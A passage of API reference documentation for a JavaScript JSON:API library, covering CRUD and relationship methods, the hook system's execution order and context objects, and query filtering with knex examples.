        name: 'John Doe'
      }
    }
  ],
  meta: {
    page: {
      total: 50,
      size: 10,
      number: 1
    }
  },
  links: {
    self: '/articles?page[number]=1',
    next: '/articles?page[number]=2',
    last: '/articles?page[number]=5'
  }
}
```

**Simplified Mode (simplified: true - default):**
```javascript
{
  data: [
    {
      id: '1',
      title: 'First Article',
      content: 'Article content...',
      author_id: '10',
      author: {
        id: '10',
        name: 'John Doe'
      }
    }
  ],
  meta: {
    page: {
      total: 50,
      size: 10,
      number: 1
    }
  }
}
```

#### HTTP Equivalent

```http
GET /articles?include=author&fields[articles]=title,content&fields[users]=name&filter[status]=published&sort=-created-at&page[number]=1&page[size]=10
Accept: application/vnd.api+json
```

#### Examples

**Basic Query:**
```javascript
// Get all articles (simplified mode by default)
const result = await api.resources.articles.query({});

// HTTP equivalent
// GET /articles
```

**Query with Filtering:**
```javascript
// Get published articles by a specific author
const result = await api.resources.articles.query({
  queryParams: {
    filters: {
      status: 'published',
      author_id: '10'
    }
  }
});

// HTTP equivalent
// GET /articles?filter[status]=published&filter[author_id]=10
```

**Query with Sorting and Pagination:**
```javascript
// Get articles sorted by creation date (newest first), page 2
const result = await api.resources.articles.query({
  queryParams: {
    sort: ['-created-at', 'title'],
    page: {
      number: 2,
      size: 20
    }
  }
});

// HTTP equivalent
// GET /articles?sort=-created-at,title&page[number]=2&page[size]=20
```

**Query with Includes and Sparse Fields:**
```javascript
// Get articles with author and comments, only specific fields
const result = await api.resources.articles.query({
  queryParams: {
    include: ['author', 'comments.user'],
    fields: {
      articles: 'title,summary',
      users: 'name,avatar',
      comments: 'content,created-at'
    }
  }
});

// HTTP equivalent
// GET /articles?include=author,comments.user&fields[articles]=title,summary&fields[users]=name,avatar&fields[comments]=content,created-at
```

**JSON:API Mode Query:**
```javascript
// Force JSON:API response format
const result = await api.resources.articles.query({
  queryParams: {
    filters: { status: 'published' },
    include: ['author']
  },
  simplified: false
});

// Returns full JSON:API structure with type, id, attributes, relationships
```

**Cursor-based Pagination:**
```javascript
// Get next page using cursor
const result = await api.resources.articles.query({
  queryParams: {
    page: {
      after: 'eyJpZCI6MTAsImNyZWF0ZWRBdCI6IjIwMjQtMDEtMTUifQ==',
      size: 10
    }
  }
});

// HTTP equivalent
// GET /articles?page[after]=eyJpZCI6MTAsImNyZWF0ZWRBdCI6IjIwMjQtMDEtMTUifQ==&page[size]=10
```

---

### GET - Retrieve Single Resource

Retrieves a single resource by its ID with optional relationship inclusion.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].get(params, context)
```

#### Parameters

```javascript
{
  id: String|Number,     // Required: The unique ID of the resource
  queryParams: {
    include: Array,      // Relationship paths to include
    fields: Object       // Sparse fieldsets
  },
  simplified: Boolean,   // Override simplified mode (default: true for API)
  transaction: Object    // Database transaction object
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `id` | String\|Number | Yes | The unique ID of the resource |
| `queryParams` | Object | No | Query parameters |
| `queryParams.include` | Array | No | Relationship paths to include |
| `queryParams.fields` | Object | No | Sparse fieldsets for specific resource types |
| `simplified` | Boolean | No | Override simplified mode setting (default: true) |
| `transaction` | Object | No | Database transaction object |

#### Return Value

**JSON:API Mode (simplified: false):**
```javascript
{
  data: {
    type: 'articles',
    id: '1',
    attributes: {
      title: 'Article Title',
      content: 'Full article content...'
    },
    relationships: {
      author: {
        data: { type: 'users', id: '10' }
      }
    }
  },
  included: [
    {
      type: 'users',
      id: '10',
      attributes: {
        name: 'John Doe'
      }
    }
  ]
}
```

**Simplified Mode (simplified: true - default):**
```javascript
{
  id: '1',
  title: 'Article Title',
  content: 'Full article content...',
  author_id: '10',
  author: {
    id: '10',
    name: 'John Doe'
  }
}
```

#### HTTP Equivalent

```http
GET /articles/1?include=author&fields[articles]=title,content
Accept: application/vnd.api+json
```

#### Examples

**Basic Get:**
```javascript
// Get article by ID (simplified mode by default)
const result = await api.resources.articles.get({
  id: '1'
});

// HTTP equivalent
// GET /articles/1
```

**Get with Relationships:**
```javascript
// Get article with author and comments
const result = await api.resources.articles.get({
  id: '1',
  queryParams: {
    include: ['author', 'comments']
  }
});

// HTTP equivalent
// GET /articles/1?include=author,comments
```

**Get with Sparse Fields:**
```javascript
// Get article with only specific fields
const result = await api.resources.articles.get({
  id: '1',
  queryParams: {
    include: ['author'],
    fields: {
      articles: 'title,summary',
      users: 'name'
    }
  }
});

// HTTP equivalent
// GET /articles/1?include=author&fields[articles]=title,summary&fields[users]=name
```

**JSON:API Mode Get:**
```javascript
// Get in JSON:API format
const result = await api.resources.articles.get({
  id: '1',
  queryParams: {
    include: ['author', 'tags']
  },
  simplified: false
});

// Returns full JSON:API document structure
```

---

### POST - Create Resource

Creates a new resource with attributes and optional relationships.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].post(params, context)
```

#### Parameters

```javascript
{
  inputRecord: Object,      // Required: Resource data (JSON:API or simplified)
  queryParams: {
    include: Array,         // For response formatting
    fields: Object          // For response formatting
  },
  simplified: Boolean,      // Override simplified mode (default: true for API)
  transaction: Object,      // Database transaction object
  returnFullRecord: String  // Override return setting ('no', 'minimal', 'full')
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `inputRecord` | Object | Yes | Resource data to create |
| `inputRecord.data` | Object | Yes (JSON:API) | Resource data container |
| `inputRecord.data.type` | String | Yes (JSON:API) | Resource type |
| `inputRecord.data.attributes` | Object | Yes (JSON:API) | Resource attributes |
| `inputRecord.data.relationships` | Object | No | Related resources |
| `queryParams` | Object | No | For includes/fields in response |
| `simplified` | Boolean | No | Override simplified mode (default: true) |
| `transaction` | Object | No | Database transaction object |
| `returnFullRecord` | String | No | Override return setting ('no', 'minimal', 'full') |

#### Return Value Behavior

The return value depends on `returnFullRecord` setting and whether it's an API or transport call:

**Default behavior:**
- API calls (programmatic): `returnFullRecord = 'full'` (returns complete resource)
- Transport calls (HTTP): `returnFullRecord = 'no'` (returns 204 No Content)

**Options:**
- `'no'`: Returns `undefined` (204 No Content)
- `'minimal'`: Returns resource with ID only
- `'full'`: Returns complete resource with all fields

#### HTTP Equivalent

```http
POST /articles
Content-Type: application/vnd.api+json
Accept: application/vnd.api+json

{
  "data": {
    "type": "articles",
    "attributes": {
      "title": "New Article",
      "content": "Article content..."
    },
    "relationships": {
      "author": {
        "data": { "type": "users", "id": "10" }
      }
    }
  }
}
```

#### Examples

**Basic Create (Simplified Mode):**
```javascript
// Create article with simplified input (default mode)
const result = await api.resources.articles.post({
  inputRecord: {
    title: 'New Article',
    content: 'Article content...',
    status: 'draft',
    author_id: '10'
  }
});

// Returns full record by default for API calls
```

**Create with JSON:API Format:**
```javascript
// Create article with JSON:API format
const result = await api.resources.articles.post({
  inputRecord: {
    data: {
      type: 'articles',
      attributes: {
        title: 'New Article',
        content: 'Article content...',
        status: 'draft'
      },
      relationships: {
        author: {
          data: { type: 'users', id: '10' }
        }
      }
    }
  },
  simplified: false
});
```

**Create with Multiple Relationships:**
```javascript
// Create article with author and tags (simplified)
const result = await api.resources.articles.post({
  inputRecord: {
    title: 'New Article',
    content: 'Article content...',
    author_id: '10',
    tag_ids: ['1', '2', '3']
  },
  queryParams: {
    include: ['author', 'tags']
  }
});
```

**Create with Minimal Return:**
```javascript
// Create and return only ID
const result = await api.resources.articles.post({
  inputRecord: {
    title: 'New Article',
    content: 'Article content...'
  },
  returnFullRecord: 'minimal'
});

// Returns (simplified mode):
// {
//   id: '123'
// }
```

**Create with No Return:**
```javascript
// Create without returning data (like HTTP transport)
const result = await api.resources.articles.post({
  inputRecord: {
    title: 'New Article',
    content: 'Article content...'
  },
  returnFullRecord: 'no'
});

// Returns: undefined
```

---

### PUT - Replace Resource

Completely replaces an existing resource. All attributes must be provided; missing relationships are removed.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].put(params, context)
```

#### Parameters

```javascript
{
  inputRecord: Object,      // Required: Complete resource data
  queryParams: {
    include: Array,         // For response formatting
    fields: Object          // For response formatting
  },
  simplified: Boolean,      // Override simplified mode (default: true for API)
  transaction: Object,      // Database transaction object
  returnFullRecord: String  // Override return setting ('no', 'minimal', 'full')
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `inputRecord` | Object | Yes | Complete resource data |
| `inputRecord.id` | String | Yes (simplified) | Resource ID |
| `inputRecord.data.id` | String | Yes (JSON:API) | Must match the resource ID |
| `inputRecord.data.type` | String | Yes (JSON:API) | Resource type |
| `inputRecord.data.attributes` | Object | Yes (JSON:API) | All resource attributes |
| `inputRecord.data.relationships` | Object | No | All relationships (missing ones are nulled) |
| `queryParams` | Object | No | For response formatting |
| `simplified` | Boolean | No | Override simplified mode (default: true) |
| `transaction` | Object | No | Database transaction object |
| `returnFullRecord` | String | No | Override return setting |

#### Return Value

Updated resource based on `returnFullRecord` setting (defaults: API='full', transport='no').

#### HTTP Equivalent

```http
PUT /articles/1
Content-Type: application/vnd.api+json
Accept: application/vnd.api+json

{
  "data": {
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Updated Title",
      "content": "New content...",
      "status": "published"
    },
    "relationships": {
      "author": {
        "data": { "type": "users", "id": "10" }
      }
    }
  }
}
```

#### Examples

**Basic Replace (Simplified):**
```javascript
// Replace entire article (simplified mode)
const result = await api.resources.articles.put({
  inputRecord: {
    id: '1',
    title: 'Completely New Title',
    content: 'Entirely new content',
    status: 'published',
    author_id: '10'
    // Note: All attributes must be provided
  }
});
```

**Replace with JSON:API Format:**
```javascript
// Replace article with JSON:API format
const result = await api.resources.articles.put({
  inputRecord: {
    data: {
      type: 'articles',
      id: '1',
      attributes: {
        title: 'Updated Article',
        content: 'Updated content',
        status: 'published'
      },
      relationships: {
        author: {
          data: { type: 'users', id: '20' } // Changed author
        },
        tags: {
          data: [] // Remove all tags
        }
      }
    }
  },
  simplified: false
});
```

**Replace and Remove Relationships:**
```javascript
// Replace and explicitly remove relationships
const result = await api.resources.articles.put({
  inputRecord: {
    id: '1',
    title: 'Article Without Author',
    content: 'Content...',
    status: 'draft',
    author_id: null,  // Remove author
    tag_ids: []       // Remove all tags
  }
});
```

---

### PATCH - Update Resource

Partially updates an existing resource. Only provided attributes and relationships are modified.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].patch(params, context)
```

#### Parameters

```javascript
{
  inputRecord: Object,      // Required: Partial resource data
  queryParams: {
    include: Array,         // For response formatting
    fields: Object          // For response formatting
  },
  simplified: Boolean,      // Override simplified mode (default: true for API)
  transaction: Object,      // Database transaction object
  returnFullRecord: String  // Override return setting ('no', 'minimal', 'full')
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `inputRecord` | Object | Yes | Partial resource data |
| `inputRecord.id` | String | Yes (simplified) | Resource ID |
| `inputRecord.data.id` | String | Yes (JSON:API) | Resource ID |
| `inputRecord.data.type` | String | Yes (JSON:API) | Resource type |
| `inputRecord.data.attributes` | Object | No | Attributes to update |
| `inputRecord.data.relationships` | Object | No | Relationships to update |
| `queryParams` | Object | No | For response formatting |
| `simplified` | Boolean | No | Override simplified mode (default: true) |
| `transaction` | Object | No | Database transaction object |
| `returnFullRecord` | String | No | Override return setting |

#### Return Value

Updated resource based on `returnFullRecord` setting (defaults: API='full', transport='no').

#### HTTP Equivalent

```http
PATCH /articles/1
Content-Type: application/vnd.api+json
Accept: application/vnd.api+json

{
  "data": {
    "type": "articles",
    "id": "1",
    "attributes": {
      "status": "published"
    }
  }
}
```

#### Examples

**Basic Update (Simplified):**
```javascript
// Update only the status (simplified mode)
const result = await api.resources.articles.patch({
  inputRecord: {
    id: '1',
    status: 'published'
  }
});

// Only status is updated, other fields remain unchanged
```

**Update Multiple Attributes:**
```javascript
// Update title and content
const result = await api.resources.articles.patch({
  inputRecord: {
    id: '1',
    title: 'Updated Title',
    content: 'Updated content only',
    updated_at: new Date().toISOString()
  }
});
```

**Update with JSON:API Format:**
```javascript
// Update with JSON:API format
const result = await api.resources.articles.patch({
  inputRecord: {
    data: {
      type: 'articles',
      id: '1',
      attributes: {
        status: 'published',
        published_at: new Date().toISOString()
      },
      relationships: {
        author: {
          data: { type: 'users', id: '30' }
        }
      }
    }
  },
  simplified: false
});
```

**Update Relationships Only:**
```javascript
// Change author and add tags (simplified)
const result = await api.resources.articles.patch({
  inputRecord: {
    id: '1',
    author_id: '30',
    tag_ids: ['3', '4', '5']
  }
});
```

**Remove Optional Relationship:**
```javascript
// Set featured_image to null
const result = await api.resources.articles.patch({
  inputRecord: {
    id: '1',
    featured_image_id: null
  }
});
```

---

### DELETE - Remove Resource

Permanently deletes a resource from the system.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].delete(params, context)
```

#### Parameters

```javascript
{
  id: String|Number,    // Required: ID of resource to delete
  transaction: Object   // Database transaction object
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `id` | String\|Number | Yes | ID of resource to delete |
| `transaction` | Object | No | Database transaction object |

#### Return Value

Returns `undefined` (204 No Content)

#### HTTP Equivalent

```http
DELETE /articles/1
Accept: application/vnd.api+json
```

#### Examples

**Basic Delete:**
```javascript
// Delete article by ID
await api.resources.articles.delete({
  id: '1'
});

// Returns undefined (no content)

// HTTP equivalent
// DELETE /articles/1
```

**Delete with Transaction:**
```javascript
// Delete within a transaction
const trx = await knex.transaction();
try {
  // Delete article
  await api.resources.articles.delete({
    id: '1',
    transaction: trx
  });
  
  // Delete related comments
  await api.resources.comments.delete({
    id: '10',
    transaction: trx
  });
  
  await trx.commit();
} catch (error) {
  await trx.rollback();
  throw error;
}
```

**Note on Transaction Auto-commit:**
The library automatically manages transaction commits when you don't provide one:
- If you provide a transaction, you're responsible for committing/rolling back
- If you don't provide a transaction, the library creates one and auto-commits

---

## Relationship Methods

### getRelated - Retrieve Related Resources

Retrieves the actual related resources with full data, not just identifiers.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].getRelated(params, context)
```

#### Parameters

```javascript
{
  id: String|Number,           // Required: Parent resource ID
  relationshipName: String,    // Required: Name of the relationship
  queryParams: Object,         // Standard query parameters
  transaction: Object          // Database transaction object
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `id` | String\|Number | Yes | Parent resource ID |
| `relationshipName` | String | Yes | Name of the relationship |
| `queryParams` | Object | No | Standard query parameters for related resources |
| `transaction` | Object | No | Database transaction object |

#### Return Value

JSON:API response with related resources (supports all query features like filtering, pagination, etc.)

#### HTTP Equivalent

```http
GET /articles/1/author
GET /articles/1/comments?page[size]=10&sort=-created-at
Accept: application/vnd.api+json
```

#### Examples

**Get Related To-One:**
```javascript
// Get author of article
const result = await api.resources.articles.getRelated({
  id: '1',
  relationshipName: 'author'
});

// Returns single resource (simplified mode by default):
// {
//   id: '10',
//   name: 'John Doe',
//   email: 'john@example.com'
// }

// HTTP equivalent
// GET /articles/1/author
```

**Get Related To-Many with Pagination:**
```javascript
// Get comments with pagination
const result = await api.resources.articles.getRelated({
  id: '1',
  relationshipName: 'comments',
  queryParams: {
    page: { size: 5, number: 1 },
    sort: ['-created-at']
  }
});

// Returns paginated collection

// HTTP equivalent
// GET /articles/1/comments?page[size]=5&page[number]=1&sort=-created-at
```

---

### getRelationship - Retrieve Relationship Identifiers

Retrieves only the resource identifiers for a relationship, not the full resource data.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].getRelationship(params, context)
```

#### Parameters

```javascript
{
  id: String|Number,           // Required: Parent resource ID
  relationshipName: String,    // Required: Name of the relationship
  transaction: Object          // Database transaction object
}
```

#### Return Value

JSON:API relationship document with resource identifiers only

#### HTTP Equivalent

```http
GET /articles/1/relationships/author
GET /articles/1/relationships/tags
Accept: application/vnd.api+json
```

#### Examples

**Get To-One Relationship:**
```javascript
// Get author relationship
const result = await api.resources.articles.getRelationship({
  id: '1',
  relationshipName: 'author'
});

// Returns:
// {
//   data: { type: 'users', id: '10' }
// }

// HTTP equivalent
// GET /articles/1/relationships/author
```

**Get To-Many Relationship:**
```javascript
// Get tags relationship
const result = await api.resources.articles.getRelationship({
  id: '1',
  relationshipName: 'tags'
});

// Returns:
// {
//   data: [
//     { type: 'tags', id: '1' },
//     { type: 'tags', id: '2' },
//     { type: 'tags', id: '3' }
//   ]
// }

// HTTP equivalent
// GET /articles/1/relationships/tags
```

---

### postRelationship - Add to Relationship

Adds new members to a to-many relationship without affecting existing members.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].postRelationship(params, context)
```

#### Parameters

```javascript
{
  id: String|Number,           // Required: Parent resource ID
  relationshipName: String,    // Required: Name of the relationship
  relationshipData: Array,     // Required: Array of resource identifiers
  transaction: Object          // Database transaction object
}
```

#### Return Value

Returns `undefined` (204 No Content)

#### HTTP Equivalent

```http
POST /articles/1/relationships/tags
Content-Type: application/vnd.api+json

{
  "data": [
    { "type": "tags", "id": "4" },
    { "type": "tags", "id": "5" }
  ]
}
```

#### Examples

**Add Tags to Article:**
```javascript
// Add new tags without removing existing ones
await api.resources.articles.postRelationship({
  id: '1',
  relationshipName: 'tags',
  relationshipData: [
    { type: 'tags', id: '4' },
    { type: 'tags', id: '5' }
  ]
});

// Existing tags remain, new tags are added
```

---

### patchRelationship - Replace Relationship

Completely replaces a relationship. For to-one relationships, sets the new related resource. For to-many relationships, replaces all members.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].patchRelationship(params, context)
```

#### Parameters

```javascript
{
  id: String|Number,                    // Required: Parent resource ID
  relationshipName: String,             // Required: Name of the relationship
  relationshipData: Object|Array|null,  // Required: New relationship data
  transaction: Object                   // Database transaction object
}
```

#### Return Value

Returns `undefined` (204 No Content)

#### HTTP Equivalent

```http
PATCH /articles/1/relationships/author
Content-Type: application/vnd.api+json

{
  "data": { "type": "users", "id": "20" }
}
```

#### Examples

**Replace To-One Relationship:**
```javascript
// Change article author
await api.resources.articles.patchRelationship({
  id: '1',
  relationshipName: 'author',
  relationshipData: { type: 'users', id: '20' }
});
```

**Replace To-Many Relationship:**
```javascript
// Replace all tags
await api.resources.articles.patchRelationship({
  id: '1',
  relationshipName: 'tags',
  relationshipData: [
    { type: 'tags', id: '1' },
    { type: 'tags', id: '2' }
  ]
});

// All previous tags are removed, only specified tags remain
```

**Clear Relationship:**
```javascript
// Remove all tags
await api.resources.articles.patchRelationship({
  id: '1',
  relationshipName: 'tags',
  relationshipData: []
});

// Remove author
await api.resources.articles.patchRelationship({
  id: '1',
  relationshipName: 'author',
  relationshipData: null
});
```

---

### deleteRelationship - Remove from Relationships

Removes specific members from a to-many relationship.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].deleteRelationship(params, context)
```

#### Parameters

```javascript
{
  id: String|Number,           // Required: Parent resource ID
  relationshipName: String,    // Required: Name of the relationship
  relationshipData: Array,     // Required: Array of resource identifiers to remove
  transaction: Object          // Database transaction object
}
```

#### Return Value

Returns `undefined` (204 No Content)

#### HTTP Equivalent

```http
DELETE /articles/1/relationships/tags
Content-Type: application/vnd.api+json

{
  "data": [
    { "type": "tags", "id": "2" },
    { "type": "tags", "id": "3" }
  ]
}
```

#### Examples

**Remove Specific Tags:**
```javascript
// Remove specific tags from article
await api.resources.articles.deleteRelationship({
  id: '1',
  relationshipName: 'tags',
  relationshipData: [
    { type: 'tags', id: '2' },
    { type: 'tags', id: '3' }
  ]
});

// Only specified tags are removed, others remain
```

---

## Hook System

The library provides a comprehensive hook system for customizing behavior at every stage of request processing.

### Hook Execution Order by Method

Each API method has its own specific hook execution order. Here's the exact sequence for each method:

#### QUERY Method Hooks
```
1. beforeData
2. beforeDataQuery
3. knexQueryFiltering (multiple times for different filter types)
   - polymorphicFiltersHook
   - crossTableFiltersHook
   - basicFiltersHook
4. enrichRecord (for each record)
5. finish
6. finishQuery
```

#### GET Method Hooks
```
1. beforeData
2. beforeDataGet
3. checkDataPermissions
4. checkDataPermissionsGet
5. enrichRecord
6. enrichRecordWithRelationships
7. finish
8. finishGet
```

#### POST Method Hooks
```
1. beforeProcessing
2. beforeProcessingPost
3. beforeSchemaValidate
4. beforeSchemaValidatePost
5. afterSchemaValidatePost
6. afterSchemaValidate
7. beforeDataCall
8. beforeDataCallPost
9. [Database INSERT operation]
10. afterDataCallPost
11. afterDataCall
12. finish
13. finishPost
14. afterCommit (if transaction was created)
```

#### PUT Method Hooks
```
1. beforeProcessing
2. beforeProcessingPut
3. beforeSchemaValidate
4. beforeSchemaValidatePut
5. afterSchemaValidatePut
6. afterSchemaValidate
7. beforeDataCall
8. beforeDataCallPut
9. [Database UPDATE operation - full replacement]
10. afterDataCallPut
11. afterDataCall
12. finish
13. finishPut
14. afterCommit (if transaction was created)
```

#### PATCH Method Hooks
```
1. beforeProcessing
2. beforeProcessingPatch
3. beforeSchemaValidate
4. beforeSchemaValidatePatch
5. afterSchemaValidatePatch
6. afterSchemaValidate
7. beforeDataCall
8. beforeDataCallPatch
9. [Database UPDATE operation - partial update]
10. afterDataCallPatch
11. afterDataCall
12. finish
13. finishPatch
14. afterCommit (if transaction was created)
```

#### DELETE Method Hooks
```
1. beforeDataCall
2. beforeDataCallDelete
3. [Database DELETE operation]
4. afterDataCallDelete
5. afterDataCall
6. finish
7. finishDelete
8. afterCommit (if transaction was created)
```

#### Relationship Method Hooks

**getRelated:**
```
1. checkPermissions
2. checkPermissionsGetRelated
3. [Delegates to GET or QUERY methods internally]
```

**getRelationship:**
```
1. checkPermissions
2. checkPermissionsGetRelationship
3. [Delegates to GET method internally]
```

**postRelationship:**
```
1. checkPermissions
2. checkPermissionsPostRelationship
3. [Relationship manipulation]
4. finish
5. finishPostRelationship
```

**patchRelationship:**
```
1. checkPermissions
2. checkPermissionsPatchRelationship
3. [Delegates to PATCH method internally]
4. finish
5. finishPatchRelationship
```

**deleteRelationship:**
```
1. checkPermissions
2. checkPermissionsDeleteRelationship
3. [Relationship manipulation]
4. finish
5. finishDeleteRelationship
```

### Key Differences Between Methods

1. **Processing Hooks**: Only POST, PUT, and PATCH have `beforeProcessing` hooks
2. **Schema Validation**: Only POST, PUT, and PATCH have schema validation hooks
3. **Permission Checks**: GET uses `checkDataPermissions`, while relationship methods use `checkPermissions`
4. **Query Filtering**: Only QUERY method triggers `knexQueryFiltering` hooks
5. **Enrichment**: Only GET and QUERY have `enrichRecord` hooks
6. **Relationships**: Only GET has `enrichRecordWithRelationships`
7. **Transactions**: All write methods (POST, PUT, PATCH, DELETE) can trigger `afterCommit`/`afterRollback`

### Hook Context Objects

Each hook receives a context object with different properties based on the hook type and method:

#### beforeProcessing / beforeProcessing[Method]

```javascript
{
  method: 'post',              // HTTP method
  resourceType: 'articles',    // Resource being accessed
  params: {                    // Request parameters
    inputRecord: {...},
    queryParams: {...},
    simplified: true
  },
  auth: {...},                 // Authentication info
  transaction: {...},          // Database transaction
  schemaInfo: {...},           // Resource schema
  db: {...}                    // Database connection
}
```

**What can be modified:**
- `params` - Modify input data
- Add custom properties to context

**Example:**
```javascript
api.resource('articles').hook('beforeProcessingPost', async (context) => {
  // Add default status if not provided
  if (context.params.inputRecord && !context.params.inputRecord.status) {
    context.params.inputRecord.status = 'draft';
  }
  
  // Add metadata to context
  context.requestTime = new Date();
});
```

#### beforeSchemaValidate / afterSchemaValidate

```javascript
{
  method: 'patch',
  resourceType: 'articles',
  inputData: {                 // Parsed input data
    attributes: {...},
    relationships: {...}
  },
  existingRecord: {...},       // For update operations
  auth: {...},
  transaction: {...},
  schemaInfo: {...}
}
```

**What can be modified:**
- `inputData` - Modify before/after validation
- Throw errors for custom validation

**Example:**
```javascript
api.resource('articles').hook('afterSchemaValidate', async (context) => {
  // Custom validation
  if (context.inputData.attributes.status === 'published' && 
      !context.inputData.attributes.published_at) {
    throw new Error('Published articles must have a published_at date');
  }
});
```

#### checkDataPermissions / checkDataPermissions[Method]

```javascript
{
  method: 'delete',
  resourceType: 'articles',
  id: '1',                     // For single resource operations
  auth: {...},
  existingRecord: {...},       // For update/delete
  transaction: {...}
}
```

**Purpose:** Authorization checks - throw error to deny access

**Example:**
```javascript
api.resource('articles').hook('checkDataPermissionsDelete', async (context) => {
  // Only author or admin can delete
  if (context.auth.userId !== context.existingRecord.author_id && 
      !context.auth.isAdmin) {
    throw new Error('Unauthorized to delete this article');
  }
});
```

#### beforeData / afterData

```javascript
{
  method: 'get',
  resourceType: 'articles',
  storageParams: {             // Parameters for storage layer
    id: '1',
    include: ['author'],
    fields: {...},
    filters: {...}
  },
  result: {...},               // After data operations
  auth: {...},
  transaction: {...},
  schemaInfo: {...}
}
```

**What can be modified:**
- `storageParams` (beforeData) - Modify query parameters
- `result` (afterData) - Modify query results

**Example:**
```javascript
api.resource('articles').hook('beforeDataQuery', async (context) => {
  // Add automatic filtering based on user
  if (context.auth.userId && !context.auth.isAdmin) {
    context.storageParams.filters = {
      ...context.storageParams.filters,
      author_id: context.auth.userId
    };
  }
});
```

#### enrichRecord

```javascript
{
  method: 'get',
  resourceType: 'articles',
  record: {                    // Full JSON:API record
    type: 'articles',
    id: '1',
    attributes: {...},
    relationships: {...}
  },
  isMainResource: true,        // vs included resource
  auth: {...},
  requestedFields: [...],      // Fields requested via sparse fieldsets
  parentContext: {...}         // Parent request context
}
```

**What can be modified:**
- `record` - Modify the entire record structure

**Example:**
```javascript
api.resource('articles').hook('enrichRecord', async (context) => {
  // Add metadata
  context.record.meta = {
    can_edit: context.auth.userId === context.record.attributes.author_id,
    version: context.record.attributes.version || 1
  };
});
```

#### enrichAttributes

```javascript
{
  method: 'get',
  resourceType: 'articles',
  attributes: {...},           // Current attributes
  requestedComputedFields: ['word_count', 'reading_time'],
  isMainResource: true,
  record: {...},               // Full record for reference
  auth: {...},
  parentContext: {...},
  computedDependencies: Set    // Fields to remove if not requested
}
```

**What can be modified:**
- `attributes` - Add/modify attribute values

**Example:**
```javascript
api.resource('articles').hook('enrichAttributes', async (context) => {
  // Add computed fields
  if (context.requestedComputedFields.includes('word_count')) {
    context.attributes.word_count = 
      context.attributes.content.split(/\s+/).length;
  }
  
  if (context.requestedComputedFields.includes('reading_time')) {
    const wordsPerMinute = 200;
    context.attributes.reading_time = 
      Math.ceil(context.attributes.word_count / wordsPerMinute);
  }
});
```

#### finish / finish[Method]

```javascript
{
  method: 'post',
  resourceType: 'articles',
  response: {                  // Final response object
    data: {...},
    included: [...],
    meta: {...}
  },
  auth: {...}
}
```

**What can be modified:**
- `response` - Final modifications to response

**Example:**
```javascript
api.resource('articles').hook('finish', async (context) => {
  // Add response metadata
  context.response.meta = {
    ...context.response.meta,
    generated_at: new Date().toISOString(),
  };
});
```

#### afterCommit / afterRollback

```javascript
{
  method: 'post',
  resourceType: 'articles',
  result: {...},               // Operation result
  error: {...},                // For rollback
  auth: {...},
  params: {...}                // Original parameters
}
```

**Use cases:**
- Send emails, notifications
- Clear caches
- Log events
- Cleanup on failure

**Example:**
```javascript
api.resource('articles').hook('afterCommit', async (context) => {
  if (context.method === 'post') {
    // Send notification email
    await emailService.sendNewArticleNotification({
      articleId: context.result.data.id,
      authorId: context.auth.userId
    });
  }
});
```

### Method-Specific Hooks

You can register hooks for specific methods by appending the method name:

```javascript
// Runs only for POST requests
api.resource('articles').hook('beforeDataPost', async (context) => {
  context.inputData.attributes.created_by = context.auth.userId;
});

// Runs only for PATCH requests
api.resource('articles').hook('beforeDataPatch', async (context) => {
  context.inputData.attributes.updated_by = context.auth.userId;
  context.inputData.attributes.updated_at = new Date().toISOString();
});

// Runs only for DELETE requests
api.resource('articles').hook('beforeDataDelete', async (context) => {
  // Archive instead of delete
  context.softDelete = true;
  context.inputData = {
    attributes: {
      deleted_at: new Date().toISOString(),
      deleted_by: context.auth.userId
    }
  };
});
```

### Query-Specific Hooks

#### knexQueryFiltering

Special hook for modifying database queries:

```javascript
api.resource('articles').hook('knexQueryFiltering', async (context) => {
  const { query, filters, resourceSchema } = context;
  
  // Add custom where clauses
  if (filters.search) {
    query.where(function() {
      this.where('title', 'like', `%${filters.search}%`)
          .orWhere('content', 'like', `%${filters.search}%`);
    });
  }
  
  // Add joins for complex filtering
  if (filters.author_name) {
    query.join('users', 'articles.author_id', 'users.id')
         .where('users.name', 'like', `%${filters.author_name}%`);
  }
});
```

---

## Query Features

### Filtering

The library supports flexible filtering through the `filters` parameter in query operations.

#### Basic Filtering

```javascript
// Simple equality filter
const result = await api.resources.articles.query({
  queryParams: {
    filters: {
      status: 'published',
      author_id: '10'
    }
  }
});

// HTTP equivalent
// GET /articles?filter[status]=published&filter[author_id]=10
```

#### Operator-based Filtering

Filters support various operators when defined in the resource schema:

```javascript
// Resource schema configuration
searchSchema: {
  created_at: {
    type: 'datetime',
    operators: ['gt', 'gte', 'lt', 'lte']
  },
  title: {
    type: 'string',
    operators: ['eq', 'like', 'ilike']
  },
  view_count: {
    type: 'number',
    operators: ['eq', 'gt', 'gte', 'lt', 'lte', 'in']
  }
}

// Usage
const result = await api.resources.articles.query({
  queryParams: {
    filters: {
      'created_at:gte': '2024-01-01',
      'created_at:lt': '2024-02-01',
      'title:like': '%javascript%',
      'view_count:gt': 100
    }
  }
});
```

#### Array Filters (IN operator)

```javascript
// Find articles with specific IDs
const result = await api.resources.articles.query({
  queryParams: {
    filters: {
      'id:in': ['1', '2', '3'],
      'status:in': ['published', 'featured']
    }
  }
});

// HTTP equivalent (comma-separated)
// GET /articles?filter[id:in]=1,2,3&filter[status:in]=published,featured
```

#### Custom Filter Logic

Use the `knexQueryFiltering` hook for complex filtering:

```javascript
api.resource('articles').hook('knexQueryFiltering', async (context) => {
  const { query, filters } = context;
  
  // Full-text search
  if (filters.q) {
    query.whereRaw("to_tsvector('english', title || ' ' || content) @@ plainto_tsquery('english', ?)", [filters.q]);
  }
  
  // Date range
  if (filters.date_from && filters.date_to) {
    query.whereBetween('created_at', [filters.date_from, filters.date_to]);
